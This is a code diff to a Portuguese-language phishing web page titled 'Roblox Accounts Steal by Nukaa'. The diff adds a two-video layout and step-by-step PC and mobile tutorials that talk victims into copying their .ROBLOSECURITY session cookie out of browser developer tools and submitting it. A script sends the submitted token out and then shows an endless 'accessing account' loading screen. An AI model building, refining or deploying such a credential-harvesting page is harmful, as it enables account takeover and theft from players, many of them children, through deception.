@@ -9,14 +9,37 @@
       background: linear-gradient(135deg, #0f001a, #1a0033);
       color: #e0ccff;
       font-family: 'Segoe UI', Arial, sans-serif;
-      text-align: center;
-      padding: 0;
       margin: 0;
+      padding: 0;
       min-height: 100vh;
-      overflow: hidden;
+      overflow-x: hidden;
     }
-    #main {
-      padding: 60px 20px;
+    .container {
+      display: flex;
+      flex-direction: row;
+      min-height: 100vh;
+    }
+    .video-sidebar {
+      width: 35%;
+      min-width: 320px;
+      background: #000;
+      position: relative;
+      flex-shrink: 0;
+    }
+    .video-sidebar iframe {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+    }
+    #main-content {
+      flex: 1;
+      padding: 60px 40px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
     h1 {
       color: #ff0044;
@@ -27,7 +50,7 @@
     .subtitle {
       color: #ff88aa;
       font-size: 1.6em;
-      margin-bottom: 50px;
+      margin-bottom: 30px;
       font-weight: bold;
     }
     input {
@@ -39,7 +62,7 @@
       border-radius: 12px;
       background: #0d001a;
       color: #ffccdd;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
       box-shadow: inset 0 0 10px #660022;
     }
     button {
@@ -58,12 +81,31 @@
       transform: scale(1.08);
     }
     #status {
-      margin-top: 40px;
+      margin-top: 30px;
       font-size: 20px;
       font-weight: bold;
     }
     .glow {
       text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033;
+    }
+    .tutorial {
+      background: rgba(20, 0, 40, 0.6);
+      border: 1px solid #660033;
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 30px;
+      max-width: 500px;
+      text-align: left;
+      font-size: 1.1em;
+      line-height: 1.5;
+    }
+    .tutorial h3 {
+      color: #ff88aa;
+      margin-top: 0;
+    }
+    .tutorial ul {
+      padding-left: 20px;
+      margin: 10px 0;
     }
 
     /* Loading screen */
@@ -97,21 +139,106 @@
       text-shadow: 0 0 15px #ff0044;
       min-height: 80px;
     }
+
+    /* Responsivo */
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+      }
+      .video-sidebar {
+        width: 100%;
+        height: 35vh;
+        min-height: 200px;
+      }
+      #main-content {
+        padding: 40px 20px;
+      }
+      #video-right {
+        order: 2;
+      }
+      #tutorial-pc {
+        display: none; /* esconde tutorial PC no mobile */
+      }
+      #tutorial-mobile {
+        display: block; /* mostra tutorial mobile */
+      }
+    }
+    @media (min-width: 901px) {
+      #tutorial-mobile {
+        display: none; /* esconde mobile no PC */
+      }
+      #tutorial-pc {
+        display: block;
+      }
+    }
   </style>
 </head>
 <body>
 
-  <div id="main">
-    <h1 class="glow">Roblox Accounts Steal by Nukaa</h1>
-    <p class="subtitle">Insira o token aqui</p>
+  <div class="container">
+    <!-- Vídeo à esquerda -->
+    <div class="video-sidebar" id="video-left">
+      <iframe 
+        src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" 
+        title="YouTube video 1" 
+        frameborder="0" 
+        allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen>
+      </iframe>
+    </div>
 
-    <input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
-    <br>
-    <button id="sendBtn" onclick="enviar()">Enviar token</button>
+    <!-- Conteúdo principal -->
+    <div id="main-content">
+      <h1 class="glow">Roblox Accounts Steal by Nukaa</h1>
+      <p class="subtitle">Insira o token aqui</p>
 
-    <div id="status"></div>
+      <input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
+      <br>
+      <button id="sendBtn" onclick="enviar()">Enviar token</button>
+
+      <div id="status"></div>
+
+      <!-- Tutorial para PC (aparece só em desktop) -->
+      <div id="tutorial-pc" class="tutorial">
+        <h3>Tutorial para PC (Chrome/Edge):</h3>
+        <ul>
+          <li>Abra o Roblox no navegador (www.roblox.com) e faça login na sua conta.</li>
+          <li>Pressione F12 ou Ctrl + Shift + I para abrir as Ferramentas do Desenvolvedor.</li>
+          <li>Vá na aba "Application" (ou "Aplicativo") → "Cookies" → "https://www.roblox.com".</li>
+          <li>Procure o cookie chamado <strong>.ROBLOSECURITY</strong>.</li>
+          <li>Clique nele → Copie o valor completo (começa com _|WARNING:...).</li>
+          <li>Cole aqui no campo acima e clique em "Enviar token".</li>
+        </ul>
+      </div>
+
+      <!-- Tutorial para Mobile (aparece só em mobile) -->
+      <div id="tutorial-mobile" class="tutorial">
+        <h3>Tutorial para Celular (Android/iOS):</h3>
+        <ul>
+          <li>Abra o navegador (Chrome ou Safari) e entre no site www.roblox.com.</li>
+          <li>Faça login na sua conta Roblox.</li>
+          <li>Toque nos 3 pontinhos (menu) → "Configurações do site" ou "Ferramentas do desenvolvedor" (pode precisar ativar no menu do navegador).</li>
+          <li>Se não achar: use o PC ou peça ajuda a alguém com computador.</li>
+          <li>Alternativa: copie o token do app Roblox (vá em Configurações → Segurança → Cookies avançados se disponível).</li>
+          <li>Cole o token completo aqui e toque em "Enviar token".</li>
+        </ul>
+        <p style="color: #ff8888; font-size: 0.9em;">Dica: É mais fácil no computador, mas funciona no celular também!</p>
+      </div>
+    </div>
+
+    <!-- Vídeo à direita -->
+    <div class="video-sidebar" id="video-right">
+      <iframe 
+        src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" 
+        title="YouTube video 2" 
+        frameborder="0" 
+        allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen>
+      </iframe>
+    </div>
   </div>
 
+  <!-- Loading infinito -->
   <div id="loading">
     <div class="spinner"></div>
     <div id="loading-text">Acessando conta...</div>
@@ -135,7 +262,7 @@
     let interval;
 
     function showLoading() {
-      document.getElementById("main").style.display = "none";
+      document.querySelector('.container').style.display = "none";
       document.getElementById("loading").style.display = "flex";
 
       const textEl = document.getElementById("loading-text");
@@ -143,7 +270,7 @@
       interval = setInterval(() => {
         textEl.innerText = messages[msgIndex];
         msgIndex = (msgIndex + 1) % messages.length;
-      }, 2800); // muda a cada 2.8 segundos
+      }, 2800);
     }
 
     function enviar() {
@@ -188,7 +315,7 @@
       })
       .then(() => {
         status.innerHTML = "";
-        showLoading(); // loading infinito puro
+        showLoading();
       })
       .catch(() => {
         status.innerHTML = "Falha ao enviar. Tente novamente.";
